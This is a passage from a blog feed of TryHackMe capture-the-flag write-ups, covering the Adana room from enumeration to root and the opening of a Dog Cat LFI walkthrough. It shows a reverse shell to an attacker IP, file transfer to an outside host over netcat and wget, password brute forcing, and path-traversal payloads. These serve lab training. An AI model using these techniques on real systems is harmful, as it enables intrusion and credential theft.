    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;NOTE: There is an issue in the machine sometimes. On a previous run, I got:
&lt;img src=&#34;https://i.imgur.com/ZMCTsca.png&#34; alt=&#34;Home page of the website showing a database error&#34;  /&gt;
&lt;code&gt;nmap&lt;/code&gt; shows its a WordPress website, but &amp;hellip; we do not see anything here except the error.&lt;/p&gt;
&lt;p&gt;Redeploy the machine to fix the error. You &lt;em&gt;may&lt;/em&gt; also see it later, and not immediately. Don&amp;rsquo;t panic, just reset.&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello World &amp;amp;#8211; Just another WordPress site
Service Info: OS: Unix
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing special.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u adana.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 108 -q
/wp-content           (Status: 301) [Size: 311] [--&amp;gt; http://adana.thm/wp-content/]
/wp-login.php         (Status: 200) [Size: 6544]                                  
/license.txt          (Status: 200) [Size: 19915]                                 
/announcements        (Status: 301) [Size: 314] [--&amp;gt; http://adana.thm/announcements/]
/wp-includes          (Status: 301) [Size: 312] [--&amp;gt; http://adana.thm/wp-includes/]  
/javascript           (Status: 301) [Size: 311] [--&amp;gt; http://adana.thm/javascript/]   
/readme.html          (Status: 200) [Size: 7278]                                     
/wp-admin             (Status: 301) [Size: 309] [--&amp;gt; http://adana.thm/wp-admin/]     
/phpmyadmin           (Status: 301) [Size: 311] [--&amp;gt; http://adana.thm/phpmyadmin/]   
/xmlrpc.php           (Status: 200) [Size: 0]                                        
/wp-signup.php        (Status: 500) [Size: 2609]                                     
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Take note of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;announcements&lt;/li&gt;
&lt;li&gt;phpmyadmin&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Rest looks generic WordPress stuff.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;Add the line &lt;code&gt;10.10.195.53    adana.thm&lt;/code&gt; in &lt;code&gt;/etc/hosts&lt;/code&gt;. How do I know &lt;code&gt;adana.thm&lt;/code&gt; is the domain name? Check the source code!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/wp7s0UF.png&#34; alt=&#34;WordPress website mainpage&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Standard WordPress website&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hakanbey01&lt;/code&gt; is the only user, thus the admin&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We find the &amp;ldquo;hidden directory&amp;rdquo;,
&lt;img src=&#34;https://i.imgur.com/c1twr1H.png&#34; alt=&#34;hidden directory contents&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;14-steganography&#34;&gt;1.4. Steganography&lt;/h3&gt;
&lt;p&gt;Interesting. Checking the &lt;code&gt;strings&lt;/code&gt; and the &lt;code&gt;binwalk&lt;/code&gt; commands showed nothing, however, &lt;code&gt;steghide&lt;/code&gt; allows me to enter a passphrase.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile ant.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Time to use &lt;a class=&#34;link&#34; href=&#34;https://github.com/RickdeJager/stegseek&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;stegseek&lt;/a&gt;!&lt;/p&gt;
&lt;p&gt;Against what list? The one given to us in the same directory :)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ stegseek -wl wordlist.txt ant.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: &amp;quot;123adana{sorry, the rest was so tasty ... }&amp;quot;
[i] Original filename: &amp;quot;user-pass-ftp.txt&amp;quot;.
[i] Extracting to &amp;quot;ant.jpg.out&amp;quot;.


┌──(kali㉿kali)-[/tmp]
└─$ cat ant.jpg.out
RlRQLUxPR0{hidden ... }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We decode this, which looks like a base64. It gives us FTP credentials! Also, quite interesting is the same prefix is used for both the passwords &amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;15-ftp&#34;&gt;1.5 FTP&lt;/h3&gt;
&lt;p&gt;Looking around, we get an interesting file, &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

...

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( &#39;DB_NAME&#39;, &#39;phpmyadmin1&#39; );

/** MySQL database username */
define( &#39;DB_USER&#39;, &#39;{I hid this ;) }&#39; );

/** MySQL database password */
define( &#39;DB_PASSWORD&#39;, &#39;{oooo noice}&#39; );

/** MySQL hostname */
define( &#39;DB_HOST&#39;, &#39;localhost&#39; );

...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Info gathered:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Database name&lt;/li&gt;
&lt;li&gt;Database username&lt;/li&gt;
&lt;li&gt;Database password&lt;/li&gt;
&lt;li&gt;Database hostname&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We have the database credentials &amp;hellip; how could we use them?&lt;/p&gt;
&lt;h3 id=&#34;16-phpmyadmin&#34;&gt;1.6. phpMyAdmin&lt;/h3&gt;
&lt;p&gt;Recall we saw &lt;code&gt;/phpmyadmin/&lt;/code&gt;. Login with the database credentials we saw in the config.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/yvHbpz9.png&#34; alt=&#34;Errors in creds in phpmyadmin&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;If at this point, you see a bunch of errors, restart the machine. They should NOT happen, and the creds &lt;em&gt;are&lt;/em&gt; correct.&lt;/p&gt;
&lt;p&gt;Make sure to re-edit your &lt;code&gt;/etc/hosts&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/F8WN2dC.png&#34; alt=&#34;phpMyAdmin administrator page&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We are in!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s go to the database we saw eariler. In the &lt;code&gt;wp_users&lt;/code&gt; tab, we see the username (which we saw earlier) and password hash!&lt;/p&gt;
&lt;h3 id=&#34;17-hash-cracking&#34;&gt;1.7. Hash Cracking&lt;/h3&gt;
&lt;p&gt;Find the correct mode in hashcat, and we have:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ hashcat -m {mode} hash.txt /usr/share/wordlists/rockyou.txt --quiet
{hash}:{password :D }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;YES!&lt;/p&gt;
&lt;h3 id=&#34;18-wordpress-login&#34;&gt;1.8. WordPress Login&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/aqVgSnL.png&#34; alt=&#34;WordPress login page, entering credentials we saw above&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Uh oh. Checking the &lt;code&gt;wp-config&lt;/code&gt; again, we see:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/** MySQL hostname */
define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;sneaky, don&amp;rsquo;t you think? Could be &lt;code&gt;adana.thm&lt;/code&gt; &amp;hellip; or maybe it isn&amp;rsquo;t. Checking the &lt;code&gt;wp_options&lt;/code&gt; tab on &lt;code&gt;/phpmyadmin/&lt;/code&gt;, we get the &lt;strong&gt;subdomain&lt;/strong&gt; :D&lt;/p&gt;
&lt;h3 id=&#34;19-wordpress-login-in-subdomain&#34;&gt;1.9. WordPress Login in Subdomain&lt;/h3&gt;
&lt;p&gt;Edit the line
&lt;code&gt;10.10.190.211   adana.thm&lt;/code&gt;
to
&lt;code&gt;10.10.190.211   adana.thm subdomain.adana.thm&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/mru5pq8.png&#34; alt=&#34;WordPress admin page on the subdomain&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;I know of two ways we can get a shell:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Appearance -&amp;gt; Theme Editor -&amp;gt; edit 404.php&lt;/li&gt;
&lt;li&gt;Plugins -&amp;gt; Add new -&amp;gt; Upload zip of phprevshell.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;However, we see:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/rTWJrLa.png&#34; alt=&#34;404.php edit page permissions error&#34;  /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/r38C0xu.png&#34; alt=&#34;add new plugin page permissions error&#34;  /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;a permission error for both. If only there was a way we could edit the file permissions &amp;hellip;&lt;/p&gt;
&lt;h3 id=&#34;21-ftp-again&#34;&gt;2.1. FTP (again)&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;ftp&amp;gt; pwd
257 &amp;quot;/wp-content/themes/twentynineteen&amp;quot; is the current directory
ftp&amp;gt; chmod 777 404.php
200 SITE CHMOD command ok.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Upload a reverse shell using the route 1 mentioned above. Shell taken from &lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Reverse Shell Generator&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ nc -lnvp 443           
listening on [any] 443 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.190.211] 43448
Linux ubuntu 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 04:31:28 up 23 min,  0 users,  load average: 0.01, 0.02, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can&#39;t access tty; job control turned off
$ whoami
www-data
$ pwd
/
$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in the system!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;Now, let&amp;rsquo;s get &lt;strong&gt;linpeas&lt;/strong&gt; to find priv esc vectors.
&lt;img src=&#34;https://i.imgur.com/yQfXRti.png&#34; alt=&#34;Getting linpeas to find priv esc vectors&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s the stuff it marked:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                             
/dev/disk/by-id/dm-uuid-LVM-2vWU08UHAxgr0umysQPoxtHSdFdx70llz4fwL1Q9vtLr2IL1fPcyJc851c7izh0w    /       ext4    defaults        0 0                                             
/dev/disk/by-uuid/069d6843-2a0d-4a97-b8cd-948aa75be772  /boot   ext4    defaults       0 0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;^Nothing interesting&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                                 
gdm-password Not Found                                                                  
gnome-keyring-daemon Not Found                                                          
lightdm Not Found                                                                       
vsftpd process found (dump creds from memory as root)                                   
apache2 process found (dump creds from memory as root)
sshd Not Found

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;^Nothing interesting&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                              
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                                            
gdb was found in PATH
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;^Interesting&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Searching ssl/ssh files
ListenAddress 127.0.0.1                                                                                                          
PermitRootLogin no
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
 --&amp;gt; /etc/hosts.allow file found, read the rules:
/etc/hosts.allow

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;^False positive&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Passwords inside pam.d
/etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;^Useless (?)&lt;/p&gt;
&lt;h3 id=&#34;31-sudo-token-vulnerability-fail&#34;&gt;3.1. Sudo Token Vulnerability (Fail)&lt;/h3&gt;
&lt;p&gt;Requirements to escalate privileges:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; You already have a shell as user &amp;ldquo;sampleuser&amp;rdquo;&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; &amp;ldquo;sampleuser&amp;rdquo; have used sudo to execute something in the last 15mins (by default that&amp;rsquo;s the duration of the sudo token that allows to use sudo without introducing any password)&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; cat /proc/sys/kernel/yama/ptrace_scope is 0&lt;/li&gt;
&lt;li&gt;&lt;input checked=&#34;&#34; disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; gdb is accessible (you can be able to upload it)&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;You can temporarily enable ptrace_scope with &lt;code&gt;echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope&lt;/code&gt; or permanently modifying &lt;code&gt;/etc/sysctl.d/10-ptrace.conf&lt;/code&gt; and setting &lt;code&gt;kernel.yama.ptrace_scope = 0&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Source for the exploit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;But I can&amp;rsquo;t edit &lt;code&gt;ptrace_scope&lt;/code&gt; or check the point 2. Dead end.&lt;/p&gt;
&lt;h3 id=&#34;32-lateral-escalation-password-cracking&#34;&gt;3.2. Lateral Escalation: Password Cracking&lt;/h3&gt;
&lt;p&gt;Since we do not have &lt;code&gt;ssh&lt;/code&gt;, we can try bruteforcing &lt;code&gt;sudo su&lt;/code&gt;. We can use the wordlist we saw during steganography bruteforcing.&lt;/p&gt;
&lt;p&gt;Download the sucrack files. &lt;a class=&#34;link&#34; href=&#34;http://archive.ubuntu.com/ubuntu/pool/universe/s/sucrack/sucrack_1.2.3-4_amd64.deb&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;.deb from here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Transfer this again.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/tmp$ wget 10.17.8.184/sucrack_1.2.3-4_amd64.deb
wget 10.17.8.184/sucrack_1.2.3-4_amd64.deb
--2021-06-03 05:01:53--  http://10.17.8.184/sucrack_1.2.3-4_amd64.deb
Connecting to 10.17.8.184:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16670 (16K) [application/vnd.debian.binary-package]
Saving to: &#39;sucrack_1.2.3-4_amd64.deb&#39;

sucrack_1.2.3-4_amd 100%[===================&amp;gt;]  16.28K  74.2KB/s    in 0.2s    

2021-06-03 05:01:53 (74.2 KB/s) - &#39;sucrack_1.2.3-4_amd64.deb&#39; saved [16670/16670]

www-data@ubuntu:/tmp$ dpkg -x sucrack_1.2.3-4_amd64.deb sucrack
dpkg -x sucrack_1.2.3-4_amd64.deb sucrack
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I tried with the wordlist we have aleady, but it was taking too long. According to THM Discord, it should not. Maybe I&amp;rsquo;m doing something wrong?&lt;/p&gt;
&lt;p&gt;I realised that &lt;code&gt;123adana&lt;/code&gt; is a prefix we saw for both the above passwords. Maybe the password is also starting from that? I looked it in the list and there was only one match. Did not work.&lt;/p&gt;
&lt;p&gt;How about pre-pending &lt;code&gt;123adana&lt;/code&gt; to all the words?&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sed &#39;s/^/123adana/&#39; /tmp/wordlist.txt &amp;gt; newlist.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And I tried it again &amp;hellip;&lt;/p&gt;
&lt;p&gt;After a long long time, I finally get&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt
&amp;lt;k/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt
password is: 123adanasubaru
www-data@ubuntu:/tmp/sucrack/usr/bin$ su hakanbey
Password: 123adana{mmm tasty}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;33-reverse-engineering-binary&#34;&gt;3.3. Reverse Engineering: Binary&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;hakanbey@ubuntu:~$ find  / -type f -perm -u=s 2&amp;gt;/dev/null
/bin/fusermount
/bin/su
/bin/umount
/bin/mount
/bin/ping
/usr/local/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/arping
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/binary
/usr/bin/at
/usr/bin/newgrp
/usr/sbin/pppd
/usr/sbin/exim4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/usr/bin/binary&lt;/code&gt; looks odd.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hakanbey@ubuntu:~$ /usr/bin/binary
I think you should enter the correct string here ==&amp;gt;hi
pkill: killing pid 1545 failed: Operation not permitted
pkill: killing pid 4209 failed: Operation not permitted
pkill: killing pid 4412 failed: Operation not permitted
pkill: killing pid 4414 failed: Operation not permitted
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Move binary to the place where we can get it from ftp :)
&lt;code&gt;hakanbey@ubuntu:/var/www/subdomain$ cp /usr/bin/binary .&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Give all the permissions:
&lt;code&gt;hakanbey@ubuntu:/var/www/subdomain$ chmod 777  binary &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Get the binary on your machine.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ftp&amp;gt; get binary
local: binary remote: binary
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for binary (12984 bytes).
226 Transfer complete.
12984 bytes received in 0.00 secs (93.8069 MB/s)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Doing &lt;code&gt;strings&lt;/code&gt; on the binary, we get the following interesting information.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;I think you should enter the correct string here ==&amp;gt;
/root/hint.txt
Hint! : %s
/root/root.jpg
Unable to open source!
/home/hakanbey/root.jpg
Copy /root/root.jpg ==&amp;gt; /home/hakanbey/root.jpg
Unable to copy!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we need something more, let&amp;rsquo;s do &lt;code&gt;ltrace&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ltrace ./binary
strcat(&amp;quot;war&amp;quot;, &amp;quot;zone&amp;quot;)                                                          = &amp;quot;warzone&amp;quot;
strcat(&amp;quot;warzone&amp;quot;, &amp;quot;in&amp;quot;)                                                        = &amp;quot;warzonein&amp;quot;
strcat(&amp;quot;warzonein&amp;quot;, &amp;quot;ada&amp;quot;)                                                     = &amp;quot;warzoneinada&amp;quot;
strcat(&amp;quot;{woah is this it?}&amp;quot;, &amp;quot;na&amp;quot;)                                                   = &amp;quot;{very very nice}&amp;quot;
printf(&amp;quot;I think you should enter the cor&amp;quot;...)                                  = 52
__isoc99_scanf(0x55e7ade00edd, 0x7fff37c28a60, 0, 0I think you should enter the correct string here ==&amp;gt;warzoneinada
)                           = 1
strcmp(&amp;quot;{hidden}&amp;quot;, &amp;quot;{redacted}&amp;quot;)                                       = -110
strcat(&amp;quot;pki&amp;quot;, &amp;quot;l&amp;quot;)                                                             = &amp;quot;pkil&amp;quot;
strcat(&amp;quot;pkil&amp;quot;, &amp;quot;l&amp;quot;)                                                            = &amp;quot;pkill&amp;quot;
strcat(&amp;quot;pkill&amp;quot;, &amp;quot; -9&amp;quot;)                                                         = &amp;quot;pkill -9&amp;quot;
strcat(&amp;quot;pkill -9&amp;quot;, &amp;quot; -t&amp;quot;)                                                      = &amp;quot;pkill -9 -t&amp;quot;
strcat(&amp;quot;pkill -9 -t&amp;quot;, &amp;quot; pts&amp;quot;)                                                  = &amp;quot;pkill -9 -t pts&amp;quot;
strcat(&amp;quot;pkill -9 -t pts&amp;quot;, &amp;quot;/0&amp;quot;)                                                = &amp;quot;pkill -9 -t pts/0&amp;quot;
system(&amp;quot;pkill -9 -t pts/0&amp;quot; &amp;lt;no return ...&amp;gt;
--- SIGCHLD (Child exited) ---
&amp;lt;... system resumed&amp;gt; )                                                         = 256
+++ exited (status 0) +++

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Putting in the last word works! Let&amp;rsquo;s do it on the target system.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hakanbey@ubuntu:~$ ./usr/bin/binary
./usr/bin/binary
bash: ./usr/bin/binary: No such file or directory
hakanbey@ubuntu:~$ /usr/bin/binary
/usr/bin/binary
I think you should enter the correct string here ==&amp;gt;{yee haww}
Hint! : Hexeditor 00000020 ==&amp;gt; ???? ==&amp;gt; /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==&amp;gt; /home/hakanbey/root.jpg
hakanbey@ubuntu:~$ ls
ls
binary   Documents  Music     Public    Templates  Videos
Desktop  Downloads  Pictures  root.jpg  user.txt   website
hakanbey@ubuntu:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay &amp;hellip; time for image handling&lt;/p&gt;
&lt;h3 id=&#34;34-image-handling&#34;&gt;3.4. Image Handling&lt;/h3&gt;
&lt;p&gt;Copy the image using netcat, on you machine. Follow the steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Send the file to an IP with port specified.&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;hakanbey@ubuntu:~$ nc 10.17.8.184 3333 &amp;lt; root.jpg
nc 10.17.8.184 3333 &amp;lt; root.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Listen and redirect.&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ nc -lnvp 3333 &amp;gt; img.jpg
listening on [any] 3333 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.68.111] 35942
^C
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the mentioned offset, we get:
&lt;img src=&#34;https://i.imgur.com/I37Gg1G.png&#34; alt=&#34;hex code for the image that helps us do privesc&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Using the hint from the room: &lt;code&gt;From HEX, To Base85&lt;/code&gt;, I got the password :D&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@ubuntu:~# cat root.txt
cat root.txt
THM{wowowowowow}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Dog Cat VM Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-dog-cat-vm-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-dog-cat-vm-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/nSkIlFr.png" alt="Featured image of post TryHackMe: Dog Cat VM Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/dogcat&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play here&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;recon&#34;&gt;Recon&lt;/h2&gt;
&lt;p&gt;Exploring the website, we see that images come in the form of:
&lt;code&gt;http://10.10.13.155/cats/7.jpg&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ nmap -script=default -sV -A 10.10.13.155
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 23:30 EST
Nmap scan report for 10.10.13.155
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.90 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can access this :( &lt;code&gt;http://10.10.13.155/cats/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Gobuster shows &lt;code&gt;/cat.php&lt;/code&gt; and &lt;code&gt;/dog.php&lt;/code&gt;; which shows random images of cats and dogs respectively. Okay. Wow what? There seems no other option than messing around with &lt;code&gt;php&lt;/code&gt; stuff.&lt;/p&gt;
&lt;p&gt;The room already gives us the hint of having LFI. Looking at &lt;a class=&#34;link&#34; href=&#34;php://filter/convert.base64-encode/resource=FILE&#34; &gt;OWASP LFI&lt;/a&gt; we get this &lt;code&gt;http://vulnerable_host/preview.php?file=../../../../etc/passwd%00&lt;/code&gt; giving us the exact path to the etc file, and we have a filter &lt;code&gt;php://filter/convert.base64-encode/resource=FILE&lt;/code&gt;. As they metion in &lt;code&gt;OWASP LFI&lt;/code&gt;,&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;However, in some specific implementations this vulnerability can be used to upgrade the attack from LFI to Remote Code Execution vulnerabilities that could potentially fully compromise the host.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;This enhancement is common when an attacker could be able to combine the LFI vulnerability with certain PHP wrappers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sounds interesting. When we go to &lt;code&gt;http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=dog&lt;/code&gt; we see &lt;code&gt;&amp;lt;img src=&amp;quot;dogs/&amp;lt;?php echo rand(1, 10); ?&amp;gt;.jpg&amp;quot; /&amp;gt;&lt;/code&gt;. Exactly as we expected.&lt;/p&gt;
&lt;p&gt;However, going to &lt;code&gt;http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=../../../../etc/passwd&lt;/code&gt; shows us&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/6RCCMBr.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Note how it wants us to only look at cats or dogs. I put in &lt;code&gt;http://10.10.152.133/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd&lt;/code&gt; to sneak, and it gives:&lt;/p&gt;
